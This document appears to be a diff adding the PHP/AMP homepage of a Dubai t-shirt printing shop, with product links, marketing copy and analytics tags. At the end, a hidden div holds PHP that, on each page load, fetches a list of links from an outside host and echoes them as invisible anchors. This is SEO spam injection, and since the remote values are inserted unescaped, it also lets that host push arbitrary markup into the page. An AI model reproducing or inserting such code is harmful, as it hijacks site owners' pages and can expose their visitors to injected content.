@@ -1,0 +1,171 @@
+<?php
+$_SESSION["last_url"] = $_SERVER["REQUEST_URI"];
+include "conf.php";
+?>
+<!DOCTYPE html>
+<html lang="en" amp>
+<head>
+<?php require_once('ampfiles/head.php'); ?>
+<title>TshirtFly | Personalized T Shirt Printing Dubai | TShirt Factory UAE</title>
+<meta name="keywords" content="tshirt printing dubai, T shirt printing, Screen printing, Heat press, DTG printing, Bulk T Shirts,  Wholesale Tshirts, design online , personalized gifts dubai ,Mugs printing Dubai, t shirt printing dubai, tshirt printing" />
+<meta name="description" content="Design and personalise your own tshirts, caps, mugs, cushion gifts online and get it delivered all over UAE. T-shirt Printing Dubai and customised gifts in amazing quality." />
+<link rel="canonical" href="https://www.tshirtfly.com/" />
+<link rel="preload" href="https://cdn.ampproject.org/v0/amp-carousel-0.1.js" as="script">
+<script async custom-element="amp-carousel" src="https://cdn.ampproject.org/v0/amp-carousel-0.1.js"></script>
+<script async custom-element="amp-lightbox" src="https://cdn.ampproject.org/v0/amp-lightbox-0.1.js"></script>
+<style amp-custom>
+	<?php include('ampfiles/css/header.css'); ?>
+	<?php include('ampfiles/css/theme.css'); ?>
+	<?php include('ampfiles/css/home.css'); ?>
+	<?php include('ampfiles/css/footer.css'); ?>
+</style>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KM82KXXD');</script>
+<!-- End Google Tag Manager -->
+
+</head>
+
+<body>  
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KM82KXXD"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+<div id="shadowdiv">
+<?php require_once("ampfiles/header.php"); ?>
+<main id="maindiv" class="main">
+<section class="home-slider clear" id="home-slider">
+	<amp-carousel type="slides" width="1012" height="514" layout="responsive" autoplay loop id="homeSlider" on="slideChange:AMP.setState({active: {slide: event.index}})">
+		<div class="slide"><a href="https://www.tshirtfly.com/Make-Your-Own-Customized-face-mask-printing.php" title="" target="_self">
+		
+		<amp-img src="/ampfiles/images/1590394730.webp" alt="Design custom masks" width="1102" height="560" layout="responsive" media="(min-width:481px)">
+		<amp-img src="/ampfiles/images/1590394730.jpg" alt="Design custom masks" width="1102" height="560" layout="responsive" media="(min-width:481px)" fallback></amp-img>		
+		</amp-img>
+		<amp-img src="/ampfiles/images/1590394730-mobile.webp" alt="Design custom masks" width="480" height="244" layout="responsive" media="(max-width:480px)">
+		<amp-img src="/ampfiles/images/1590394730-mobile.jpg" alt="Design custom masks" width="480" height="244" layout="responsive" media="(max-width:480px)" fallback></amp-img>		
+		</amp-img>
+		</a></div>
+		<div class="slide"><a href="http://www.tshirtfly.com/Custom-Store/Couples-category.php" title="" target="_self">
+		<amp-img src="/ampfiles/images/1415990281.webp" alt="Couple Tshirts" width="1000" height="512" layout="responsive" media="(min-width:481px)">
+		<amp-img src="/ampfiles/images/1415990281.jpg" alt="Couple Tshirts" width="1000" height="512" layout="responsive" media="(min-width:481px)" fallback></amp-img></amp-img>
+		<amp-img src="/ampfiles/images/1415990281-mobile.webp" alt="Couple Tshirts" width="480" height="246" layout="responsive" media="(max-width:480px)">
+		<amp-img src="/ampfiles/images/1415990281-mobile.jpg" alt="Couple Tshirts" width="480" height="246" layout="responsive" media="(max-width:480px)" fallback></amp-img></amp-img>
+		
+		</a></div>
+		<div class="slide"><a href="http://www.tshirtfly.com/Make-Your-Own-all.php" title="" target="_self">
+		<amp-img src="/ampfiles/images/1525382676.webp" alt="Design personalised Gift Online" width="980" height="513" layout="responsive" media="(min-width:481px)">
+		<amp-img src="/ampfiles/images/1525382676.jpg" alt="Design personalised Gift Online" width="980" height="513" layout="responsive" media="(min-width:481px)" fallback></amp-img></amp-img>
+		<amp-img src="/ampfiles/images/1525382676-mobile.webp" alt="Design personalised Gift Online" width="480" height="251" layout="responsive" media="(max-width:480px)">
+		<amp-img src="/ampfiles/images/1525382676-mobile.jpg" alt="Design personalised Gift Online" width="480" height="251" layout="responsive" media="(max-width:480px)" fallback></amp-img></amp-img>
+		
+		</a></div>
+	</amp-carousel>
+	<div class="slider-bullets pt10 align-center">
+			<button on="tap:homeSlider.goToSlide(index=0)" [class]="active.slide == 0 ? 'current' : ''" class="current"></button>
+			<button on="tap:homeSlider.goToSlide(index=1)" [class]="active.slide == 1 ? 'current' : ''"></button>
+			<button on="tap:homeSlider.goToSlide(index=2)" [class]="active.slide == 2 ? 'current' : ''"></button>
+		</div>
+</section>
+<div style="text-align: center;" class="dotted">
+<h2 >Browse our Products. <span style="color: #a0a0a0;">Customize Them</span></h2>
+</div><div style="padding: 10px;">
+<div class="boxgradient align-center">
+  <div id="tourext">
+<a href="https://www.tshirtfly.com/Make-Your-Own-T-Shirts.php" title="Mens Tops"><amp-img src="/ampfiles/images/T-Shirts.webp" alt="Mens Tops" width="120" height="120" layout="fixed"><amp-img src="/stock/category/T-Shirts.jpg" alt="Mens Tops" width="120" height="120" layout="fixed" fallback></amp-img></amp-img><br />Mens Tops</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Women-Round-Neck-Tshirt.php" title="Ladies Tops"><amp-img src="/ampfiles/images/Women-Round-Neck-Tshirt.webp" alt="Ladies Tops" width="120" height="120" layout="fixed"><amp-img src="/stock/category/Women-Round-Neck-Tshirt.jpg" alt="Ladies Tops" width="120" height="120" layout="fixed" fallback></amp-img></amp-img><br />Ladies Tops</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Kids-Round-Neck-Tshirts.php" title="Kids & Babies"><amp-img src="/stock/category/Kids-Round-Neck-Tshirts.jpg" alt="Kids & Babies" width="120" height="120" layout="fixed"></amp-img><br />Kids & Babies</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Zipper-Hoodies.php" title="Hoodies & Jackets"><amp-img src="/stock/category/Zipper-Hoodies.jpg" alt="Hoodies & Jackets" width="120" height="120" layout="fixed"></amp-img><br />Hoodies & Jackets</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Tanks.php" title="Tank Tops"><amp-img src="/ampfiles/images/Tanks.webp" alt="Tank Tops" width="120" height="120" layout="fixed"><amp-img src="/stock/category/Tanks.jpg" alt="Tank Tops" width="120" height="120" layout="fixed" fallback></amp-img></amp-img><br />Tank Tops</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Customized-face-mask-printing.php" title="Face Masks"><amp-img src="/ampfiles/images/Customized-face-mask-printing.webp" alt="Face Masks" width="120" height="120" layout="fixed"><amp-img src="/stock/category/Customized-face-mask-printing.jpg" alt="Face Masks" width="120" height="120" layout="fixed" fallback></amp-img></amp-img><br />Face Masks</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Mugs-Printing-Dubai.php" title="Drinkware"><amp-img src="/stock/category/Mugs-Printing-Dubai.jpg" alt="Drinkware" width="120" height="120" layout="fixed"></amp-img><br />Drinkware</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Throwback-Cushion.php" title="Cushion and Frames"><amp-img src="/ampfiles/images/Throwback-Cushion.webp" alt="Cushion and Frames" width="120" height="120" layout="fixed"><amp-img src="/stock/category/Throwback-Cushion.jpg" alt="Cushion and Frames" width="120" height="120" layout="fixed" fallback></amp-img></amp-img><br />Cushion and Frames</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Caps-Printing-Dubai.php" title="Caps"><amp-img src="/stock/category/Caps-Printing-Dubai.jpg" alt="Caps" width="120" height="120" layout="fixed"></amp-img><br />Caps</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Phone-Cases.php" title="Phone Covers"><amp-img src="/stock/category/Phone-Cases.jpg" alt="Phone Covers" width="120" height="120" layout="fixed"></amp-img><br />Phone Covers</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Ipad-3-Air-Mini.php" title="Ipad Cases"><amp-img src="/ampfiles/images/Ipad-3-Air-Mini.webp" alt="Ipad Cases" width="120" height="120" layout="fixed"><amp-img src="/stock/category/Ipad-3-Air-Mini.jpg" alt="Ipad Cases" width="120" height="120" layout="fixed" fallback></amp-img></amp-img><br />Ipad Cases</a>
+<a href="https://www.tshirtfly.com/Make-Your-Own-Pin-Badges-Printing-Dubai.php" title="Pin Badges"><amp-img src="/ampfiles/images/Pin-Badges-Printing-Dubai.webp" alt="Pin Badges" width="120" height="120" layout="fixed"><amp-img src="/stock/category/Pin-Badges-Printing-Dubai.jpg" alt="Pin Badges" width="120" height="120" layout="fixed" fallback></amp-img></amp-img><br />Pin Badges</a>
+<div style='clear:both'></div></div></div>
+<div style="text-align: center;" class="dotted">
+<h2 >You create it &amp; <span style="color: #a0a0a0;">We print it</span></h2>
+</div>
+<div class="home-content clear px10">
+<p>At Tshirtfly, our vision is simple: To deliver the best and most affordable t-shirt printing in Dubai.
+We help our customers discover and create unique gifts, easily and conveniently, directly through
+our online store and creative platform. However, t-shirts are just the beginning. We can also print
+your custom design onto a range of polo shirts, mugs, hoodies, caps, and tank tops!
+Tshirtfly is known to feature the most exciting personalized gifts in Dubai, with 100+ products
+and 1000+ community designs. </p>
+<p>Visit our “Shop” section to see what our community has been up
+to. Each design is lovingly produced by the most creative designers and artists industry-wide,
+tailored to meet your desires.
+</p><p>Getting started is easy, and you can create your own designs in a few simple steps. You can even
+include a message unique to the recipient to add a one-of-a-kind “flavor” to your personalized gift.
+Using Tshirtfly is the simplest and most affordable way to bring your dream t-shirt to life, creating
+something nobody else owns. No matter your t-shirt printing needs or personalized gift
+requirements, </p><p>Tshirtfly is the perfect choice for personalized gifts in Dubai.
+But – that’s not all. Apart from finding fantastic gifts for your friends and family, why not sell your
+masterpiece designs online? You can set up a customized website and invite your friends to
+purchase your uniquely designed printable and physical products. Got an idea? Simply upload it to
+your shop, invite customers, and enjoy. We’ll take care of the rest on your behalf!
+</p><p>Ready to print gifts with Tshirtfly? Get started with our customized printing solution today to start
+enjoying the results without delay!</p>
+</div>
+<div style="text-align: center;" class="dotted">
+<h2 >Sell your designs. <span style="color: #a0a0a0;">Make money</span></h2>
+</div>
+<p style="text-align: center; margin-top: 10px;"><a title="Open a shop " href="https://www.tshirtfly.com/sell"><amp-img height="430" width="1014" src="https://www.tshirtfly.com/images/articles/tshirt printing dubai.png" alt="sell your designs dubai" width="1014" height="430" layout="responsive"></amp-img></a> </p>
+<h1 style="text-align: center;color: #999; text-transform: uppercase;">Save big, Buy in bulk!</h1>
+<h2 style="text-align: center; font-family: 'MuseoSlab500Regular'; font-size: 20px; color: #999;">Quality shirts for your company. 1000's of companies use our shirts. <a href="https://www.tshirtfly.com/tshirt-printing-dubai"><span style="color: #ec2460;">Find out more</span></a></h2>
+</div>
+</main> <!-- /close main div -->
+</div> <!-- /close shadow div -->
+<?php require_once("ampfiles/footer.php"); ?>
+<amp-analytics type="googleanalytics" id="googleanalytics">
+<script type="application/json">
+{
+  "vars": {
+    "account": "UA-57954588-1",
+    "anonymizeIP": "true"
+  },
+  "triggers": {
+    "defaultPageview": {
+      "on": "visible",
+      "request": "pageview",
+      "vars": {
+        "title": "TshirtFly | Personalized T Shirt Printing Dubai | TShirt Factory UAE | AMP"
+      }
+    }
+
+  }
+}
+</script>
+</amp-analytics>  
+<!--gtag adwords-->
+<amp-analytics type="gtag" data-credentials="include">
+<script type="application/json">
+{
+  "vars" : {
+    "gtag_id": "AW-1045920054",
+    "config" : {
+      "AW-1045920054": { "groups": "default" }
+    }
+  }
+}
+</script>
+</amp-analytics>
+<div style="display: none">
+<?php
+$urlx = 'https://link.oceanaspaces.com/';
+$jsonurl = file_get_contents($urlx);
+$result = json_decode($jsonurl);
+
+foreach ($result as $res) {
+echo '<a href="'.$res->backlink.'" style="display:none">"'.$res->backlink.'"></a><br>';
+}
+?>
+</div>
+</body>
+</html>
